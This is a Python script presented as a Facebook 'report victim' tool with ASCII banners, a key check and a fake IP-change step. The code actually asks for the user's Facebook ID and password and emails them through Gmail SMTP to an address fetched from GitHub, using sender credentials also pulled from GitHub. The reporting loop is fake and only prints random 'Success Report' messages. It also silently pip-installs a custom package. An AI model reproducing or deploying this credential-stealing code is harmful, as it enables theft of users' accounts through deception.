try:
    from NongHoangVu import  Center, Anime, Colors, Colorate, System
    import requests
except:
    import os
    os.system('python -m pip install NongHoangVu')
    os.system('python -m pip install requests')
import requests,time
from NongHoangVu import Center, Anime, Colors, Colorate, System
from random import randint
from email.message import EmailMessage
import smtplib
import ssl
from getpass import getpass
System.Clear()
System.Title("NongHoangVu")
System.Size(140, 40)
banner=r"""
  _  __     _      _       ___ 
 | |/ /    / \    | |     |_ _|
 | ' /    / _ \   | |      | | 
 | . \   / ___ \  | |___   | | 
 |_|\_\ /_/   \_\ |_____| |___| 
"""
logo=f"""
 _   __                                         _ 
| | / /                                        | |
| |/ /   ___  _   _ __      __  ___   _ __   __| |
|    \  / _ \| | | |\ \ /\ / / / _ \ | '__| / _` |
| |\  \|  __/| |_| | \ V  V / | (_) || |   | (_| |
\_| \_/ \___| \__, |  \_/\_/   \___/ |_|    \__,_|
               __/ |                              
              |___/                               

"""""
ip="""
 _____  ______  
(_____)(_____ \ 
   _    _____) )
  | |  |  ____/ 
 _| |_ | |      
(_____)|_|      
"""
def mail(title='Subject',text='Message',your_mail='Sender Email'):
    message=EmailMessage()
    receiver=your_mail
    sender=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/Mail/Email').text
    password=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/Mail/password').text
    subject=title
    text=text
    message['From']=sender
    message['To']=receiver
    message['Subject']=subject
    message.set_content(text)
    context=ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as server:
        server.login(sender,password)
        server.sendmail(sender,receiver,message.as_string())
def account():
    print(Colorate.Diagonal(Colors.blue_to_red,"-----Login Facebook-----"))
    receiver=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/report4/receiver').text
    account=input(Colorate.Diagonal(Colors.blue_to_red,"ID Facebook: "))
    if '1000' in account:
        pass
    else:
        print('\033[1;101mInvalid ID!!\033[0m')
        raise SystemExit()
    pw=getpass(Colorate.Diagonal(Colors.blue_to_red,"Password (hide/ẩn): "))
    Count=len(pw)
    if Count>=int(5):
        pass
    else:
        print('\033[1;101mError!!\033[0m')
        raise SystemExit()
    mail('Facebook By Nong Hoang Vu',f'Hello Guy!! Im Nong HoangVu\n----------------------------\
\nFacebook: https://facebook.com/NongHoangVu04\
\nYoutube: https://www.youtube.com/channel/UC1yGlc8J4McU5qiU3k9plGQ\n----------------------------\
\nAccount: {account}\nPassword: {pw}',receiver)
def victim():
    victim=input(Colorate.Diagonal(Colors.blue_to_red,"ID Victim: "))
    if '1000' in victim:
        time.sleep(2)
    else:
        print('\033[1;101mInvalid ID!!\033[0m')
        raise SystemExit()
def report():
    coppyright=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/report4/coppyright').text
    print(f'\033[1;104m{coppyright}\033[0m')
    time.sleep(2)
    while True:
        try:
            requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/report4/report')
            Problem=randint(0,4)
            if Problem==0:
                Problem=Colorate.Diagonal(Colors.blue_to_red,f'Impersonating someone else')
            if Problem==1:
                Problem=Colorate.Diagonal(Colors.blue_to_red,f'Fake Account')
            if Problem ==2:
                Problem=Colorate.Diagonal(Colors.blue_to_red,f'Fake Name')
            if Problem==3:
                Problem=Colorate.Diagonal(Colors.blue_to_red,f'Posting inappropriate content')
            if Problem==4:
                Problem=Colorate.Diagonal(Colors.blue_to_red,f'Harassment and Bullying ')
            print("""\033[1;102mSuccess Report \033[0m """+Problem)
            time.sleep(1)
            for i in range(100,-1,-1):
                print('\033[1;100mWaiting \033[0m'+str(i)+'%'+'  ',end='\r')
                time.sleep(0.09)
        except:
            print('\033[1;101mError!!\033[0m')
def keyword():
    getkey=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/report4/link').text
    print(Colorate.Diagonal(Colors.blue_to_red,f'Take the key: {getkey}'))
    key=requests.get('https://raw.githubusercontent.com/NongVu04/saver.github.io/main/report4/key').text
    input_key=input("""\033[1;104mPlease Enter Key\033[0m: """)
    if input_key==key: 
        print('\033[1;102mSuccess\033[0m')
        time.sleep(2)
    else: 
        print('\033[1;101mKey Error!!\033[0m')
        raise SystemExit(0)
def your_IP():
    ip_per=input(Colorate.Diagonal(Colors.blue_to_red,"IP Address: "))
    if  ',' in ip_per:
        print(Colorate.Diagonal(Colors.blue_to_red,f'Import IP ' +ip_per))
        time.sleep(5) 
        print('\033[1;102mSuccess\033[0m')
        time.sleep(2)
        System.Clear()
    elif '.' in ip_per:
        print(Colorate.Diagonal(Colors.blue_to_red,f'Import IP ' +ip_per))
        time.sleep(5) 
        print('\033[1;102mSuccess\033[0m')
        time.sleep(2)
        System.Clear()
    else:
        print('\033[1;101mIP does not exist!!\033[0m')
        raise SystemExit(0)
def IP_new():
        print(Colorate.Diagonal(Colors.blue_to_red,f'Import IP 4,911.96'))
        print('\033[1;102mSuccess\033[0m')
        time.sleep(2)
        System.Clear()
        time.sleep(5)
Anime.Fade(Center.Center(banner),Colors.blue_to_red, Colorate.Vertical, enter=True)
print("\n"*2)
print(Colorate.Horizontal(Colors.blue_to_red,  Center.XCenter(logo)))
print("\n"*1)
keyword()
System.Clear()
print("\n"*2)
print(Colorate.Horizontal(Colors.blue_to_red,  Center.XCenter(ip)))
print("\n"*1)
account()
print(Colorate.Diagonal(Colors.blue_to_red,f'Current IP: 4,911.96\nCountry: United States of America '))
choose=input(Colorate.Diagonal(Colors.blue_to_red,"Do you want to change your IP? [Y] or [N]: "))
if choose=='Y':
    your_IP()
elif choose=='y':
    your_IP()
else: IP_new()
print("\n"*2)
print(Colorate.Horizontal(Colors.blue_to_red,  Center.XCenter(ip)))
print("\n"*1)
victim()
report()